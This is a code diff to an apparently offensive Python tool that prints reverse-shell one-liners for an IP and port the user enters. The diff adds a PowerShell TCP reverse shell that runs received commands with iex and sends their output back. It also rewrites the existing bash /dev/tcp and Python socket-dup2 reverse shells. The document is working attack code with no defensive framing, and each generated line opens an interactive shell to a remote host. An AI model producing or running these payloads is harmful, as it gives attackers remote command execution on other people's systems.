@@ -22,23 +22,24 @@ banner = f"""
 {RED}|{WHITE} 5. Netcat                                   {RED}|{RESET}                                     
 {RED}|{WHITE} 6. Java                                     {RED}|{RESET}
 {RED}|{WHITE} 7. Xterm                                    {RED}|{RESET}
+{RED}|{WHITE} 8. Powershell                               {RED}|{RESET}
 {RED}+{'-'*52}+{RESET}
 """
 
-print(banner)
-
-numbershell = input("Enter the Reverse Shell number: ").strip()
-Ipaddress = input("Enter IP address: ").strip()
-Portnumber = input("Enter port number: ").strip()
-
-bash_shell = f"bash -i >& /dev/tcp/{Ipaddress}/{Portnumber} 0>&1"
-
-python_shell = (
-    f'python3 -c "import socket,subprocess,os;'
-    f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
-    f's.connect((\'{Ipaddress}\',{Portnumber}));'
-    f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
-    f'subprocess.call([\'/bin/sh\',\'-i\'])"'
+print(banner)                                                                                                       
+                                                                                                                    
+numbershell = input("Enter the Reverse Shell number: ").strip()                                                     
+Ipaddress = input("Enter IP address: ").strip()                                                                                          
+Portnumber = input("Enter port number: ").strip()                                                                   
+                                                                                                                    
+bash_shell = f"bash -i >& /dev/tcp/{Ipaddress}/{Portnumber} 0>&1"                                                   
+                                                                                                                    
+python_shell = (                                                                                                    
+    f'python3 -c "import socket,subprocess,os;'                                                                     
+    f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'                                                          
+    f's.connect((\'{Ipaddress}\',{Portnumber}));'                                                                   
+    f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'                                         
+    f'subprocess.call([\'/bin/sh\',\'-i\'])"'                                                                       
 )
 
 PHP_shell = (
@@ -64,6 +65,20 @@ Java_shell = (
     f'p.waitFor();'
 )
 
+Powershell_shell = (
+    f'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'{Ipaddress}\',{Portnumber});'
+    f'$stream = $client.GetStream();'
+    f'[byte[]]$bytes = 0..65535|%{{0}};'
+    f'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{'
+    f'$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
+    f'$sendback = (iex $data 2>&1 | Out-String );'
+    f'$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';'
+    f'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
+    f'$stream.Write($sendbyte,0,$sendbyte.Length);'
+    f'$stream.Flush()}};'
+    f'$client.Close()"'
+)
+
 Xterm_shell = f'xterm -display {Ipaddress}:{Portnumber}'
 
 print(f"\n{RED}Generated Reverse Shell:{RESET}")
@@ -81,7 +96,7 @@ elif numbershell == "6":
     print(Java_shell)
 elif numbershell == "7":
     print(Xterm_shell)
+elif numbershell == "8":
+    print(Powershell_shell)
 else:
     print(f"{RED}[-] Not Found: Unknown option.{RESET}")
-
-
